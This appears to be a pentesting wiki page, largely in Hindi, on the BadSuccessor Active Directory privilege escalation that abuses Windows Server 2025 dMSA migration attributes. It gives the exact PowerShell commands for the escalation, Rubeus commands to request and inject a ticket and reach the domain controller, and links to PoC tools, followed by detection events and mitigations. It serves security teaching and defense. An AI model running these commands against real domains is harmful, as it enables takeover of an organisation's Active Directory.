# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**) Windows Server 2025 में आने वाली **gMSA** का अगली पीढ़ी का उत्तराधिकारी हैं। एक वैध माइग्रेशन वर्कफ़्लो प्रशासकों को एक *पुराने* खाते (उपयोगकर्ता, कंप्यूटर या सेवा खाता) को dMSA के साथ बदलने की अनुमति देता है जबकि अनुमतियों को पारदर्शी रूप से बनाए रखता है। यह वर्कफ़्लो PowerShell cmdlets जैसे `Start-ADServiceAccountMigration` और `Complete-ADServiceAccountMigration` के माध्यम से उजागर होता है और **dMSA ऑब्जेक्ट** के दो LDAP विशेषताओं पर निर्भर करता है:

* **`msDS-ManagedAccountPrecededByLink`** – *DN लिंक* पुराने (superseded) खाते के लिए।
* **`msDS-DelegatedMSAState`**       – माइग्रेशन स्थिति (`0` = कोई नहीं, `1` = प्रगति में, `2` = *पूर्ण*).

यदि एक हमलावर **किसी भी** dMSA को एक OU के अंदर बना सकता है और उन 2 विशेषताओं को सीधे संशोधित कर सकता है, तो LSASS और KDC dMSA को लिंक किए गए खाते का *उत्तराधिकारी* मानेंगे। जब हमलावर बाद में dMSA के रूप में प्रमाणीकरण करता है **तो वे लिंक किए गए खाते के सभी विशेषाधिकारों को विरासत में लेते हैं** – यदि प्रशासक खाता लिंक किया गया है तो **डोमेन एडमिन** तक।

इस तकनीक को 2025 में यूनिट 42 द्वारा **BadSuccessor** नाम दिया गया था। लेखन के समय **कोई सुरक्षा पैच** उपलब्ध नहीं है; केवल OU अनुमतियों को मजबूत करना इस समस्या को कम करता है।

### Attack prerequisites

1. एक खाता जो **एक संगठनात्मक इकाई (OU)** के अंदर ऑब्जेक्ट बनाने की *अनुमति* रखता है *और* में से कम से कम एक है:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** ऑब्जेक्ट क्लास
* `Create Child` → **`All Objects`** (सामान्य निर्माण)
2. LDAP और Kerberos के लिए नेटवर्क कनेक्टिविटी (मानक डोमेन जुड़े परिदृश्य / दूरस्थ हमला)।

## Enumerating Vulnerable OUs

यूनिट 42 ने एक PowerShell सहायक स्क्रिप्ट जारी की जो प्रत्येक OU के सुरक्षा वर्णनकर्ताओं को पार्स करती है और आवश्यक ACEs को उजागर करती है:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
नीचे, स्क्रिप्ट `(objectClass=organizationalUnit)` के लिए एक पेज्ड LDAP खोज चलाती है और हर `nTSecurityDescriptor` की जांच करती है

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (ऑब्जेक्ट क्लास *msDS-DelegatedManagedServiceAccount*)

## शोषण चरण

एक लिखने योग्य OU की पहचान होने के बाद, हमला केवल 3 LDAP लेखनों की दूरी पर है:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
प्रतिलिपि के बाद, हमलावर बस `attacker_dMSA$` के रूप में **logon** कर सकता है या Kerberos TGT का अनुरोध कर सकता है - Windows *superseded* खाते का टोकन बनाएगा।

### Automation

कई सार्वजनिक PoCs पूरे कार्यप्रवाह को लपेटते हैं जिसमें पासवर्ड पुनर्प्राप्ति और टिकट प्रबंधन शामिल है:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

**ऑब्जेक्ट ऑडिटिंग** को OUs पर सक्षम करें और निम्नलिखित Windows सुरक्षा घटनाओं की निगरानी करें:

* **5137** – **dMSA** ऑब्जेक्ट का निर्माण
* **5136** – **`msDS-ManagedAccountPrecededByLink`** का संशोधन
* **4662** – विशिष्ट विशेषता परिवर्तन
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA के लिए TGT जारी करना

`4662` (विशेषता संशोधन), `4741` (कंप्यूटर/सेवा खाता का निर्माण) और `4624` (बाद में लॉगिन) को सहसंबंधित करना जल्दी से BadSuccessor गतिविधि को उजागर करता है। **XSIAM** जैसे XDR समाधान तैयार-से-उपयोग क्वेरी के साथ आते हैं (संदर्भ देखें)।

## Mitigation

* **कम से कम विशेषाधिकार** के सिद्धांत को लागू करें – केवल विश्वसनीय भूमिकाओं को *सेवा खाता* प्रबंधन का प्रतिनिधित्व दें।
* OUs से `Create Child` / `msDS-DelegatedManagedServiceAccount` को हटा दें जो स्पष्ट रूप से इसकी आवश्यकता नहीं है।
* ऊपर सूचीबद्ध घटना आईडी की निगरानी करें और dMSAs बनाने या संपादित करने वाले *गैर-टियर-0* पहचान पर अलर्ट करें।

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
